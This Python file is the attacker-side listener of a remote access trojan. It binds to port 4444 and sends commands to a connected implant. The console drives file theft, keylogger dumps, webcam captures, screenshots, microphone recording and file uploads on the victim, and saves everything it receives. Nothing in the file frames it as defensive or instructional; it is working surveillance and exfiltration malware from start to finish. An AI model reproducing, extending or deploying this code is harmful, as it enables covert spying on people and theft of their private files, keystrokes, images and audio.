import socket
import json
import base64
import zipfile
import os

class Listener:

    def __init__(self, ip, port):
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.conn.bind((ip, port))
        self.conn.listen(0)
        print(f"[+] Listener started on {ip}:{port}")

        self.connection, address = self.conn.accept()
        print(f"[+] Connection received from {address}")

    def send(self, data):
        json_data = json.dumps(data)
        try:
            self.connection.send(json_data.encode())
        except BrokenPipeError:
            print("[-] Broken connection...Exiting now!")
            self.cleanup()
            exit(0)

    def receive(self):
        json_result = ""
        while True:
            try:
                chunk = self.connection.recv(4096).decode()
                json_result += chunk
                return json.loads(json_result)
            except ValueError:
                continue

    def download_file(self, data, path):
        try:
            if data.startswith("FOLDER:"):
                folder_name, content = data[7:].split(":", 1)
                zip_path = f"{folder_name}.zip"
                with open(zip_path, "wb") as file:
                    file.write(base64.b64decode(content))
                with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                    zip_ref.extractall(folder_name)
                os.remove(zip_path)
                return f"[+] Folder '{folder_name}' downloaded and extracted successfully!"
            else:
                with open(path, "wb") as file:
                    file.write(base64.b64decode(data))
                return "[+] File downloaded successfully!"
        except Exception as e:
            return f"[-] Error during file/folder download: {str(e)}"

    def download_audio(self, audio_data, path="audio_recording.wav"):
        try:
            missing_padding = len(audio_data) % 4
            if missing_padding:
                audio_data += "=" * (4 - missing_padding)

            audio_bytes = base64.b64decode(audio_data)

            with open(path, "wb") as audio_file:
                audio_file.write(audio_bytes)

            return f"[+] Audio file saved as '{path}' successfully!"
        except Exception as e:
            return f"[-] Error during audio file download: {str(e)}"

    def upload_file(self, path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read()).decode()
        except FileNotFoundError:
            return "[-] File not found"
        except Exception as e:
            return f"[-] Exception: {e}"

    def save_images(self, images):
        if not os.path.exists("images"):
            os.makedirs("images")
        for i, img_data in enumerate(images):
            img_bytes = base64.b64decode(img_data)
            with open(f"images/photo_{i+1}.png", "wb") as f:
                f.write(img_bytes)
        return f"[+] {len(images)} images saved in directory images!"
    
    def screenshot(self, images):
        if not os.path.exists("screenshots"):
            os.makedirs("screenshots")
        for i, img_data in enumerate(images):
            img_bytes = base64.b64decode(img_data)
            with open(f"screenshots/screenshot_{i+1}.png", "wb") as f:
                f.write(img_bytes)
        return f"[+] {len(images)} screenshots saved in directory screenshots!"
            
    def cleanup(self):
        print("[+] Closing connection...")
        self.connection.close()
        self.conn.close()

    def run(self):
        while True:
            data = input(">> ")
            command = data.split(" ", 1)

            if command[0] == "exit":
                self.send("exit")
                self.cleanup()
                return

            if command[0] == "upload":
                file_content = self.upload_file(command[1])
                data = f"upload {command[1]} {file_content}"

            elif command[0] == "capture_image":
                n = int(input("Number of images: "))
                t = int(input("Interval time in seconds[Default: 2s]: "))
                data = f"capture_image {n} {t}"
                
            elif command[0] == "mic_start":
                data = "mic_start"
        
            elif command[0] == "mic_stop":
                data = "mic_stop"

            self.send(data)
            result = self.receive()

            if command[0] == "get" or command[0] == "keyscan_dump":
                if result.startswith("[-]"): 
                    print(result) 
                else:
                    try:
                        file_name = "keylog.txt" if command[0] == "keyscan_dump" else command[1]
                        download_result = self.download_file(result, file_name)
                        print(download_result) 
                    except Exception as e:
                        print(f"[-] Error during file/folder download: {str(e)}")
            
            elif command[0] == "capture_image":
                if isinstance(result, list):
                    print(self.save_images(result))
                else:
                    print(result)
                    
            elif command[0] == "screenshot":
                self.send(data)
                result = self.receive()
                if isinstance(result, list):
                    print(self.screenshot(result))
                else:
                    print(result)

            elif command[0] == "mic_start":
                print(result)

            elif command[0] == "mic_stop":
                if result.startswith("[-]"):
                    print(result)
                else:
                    download_result = self.download_audio(result)
                    print(download_result)

            else:
                print(result)

listener = Listener("10.9.234.69", 4444)

try:
    listener.run()
except KeyboardInterrupt:
    print("\n[+] Program interrupted by user.")
    listener.cleanup()
    exit(0)
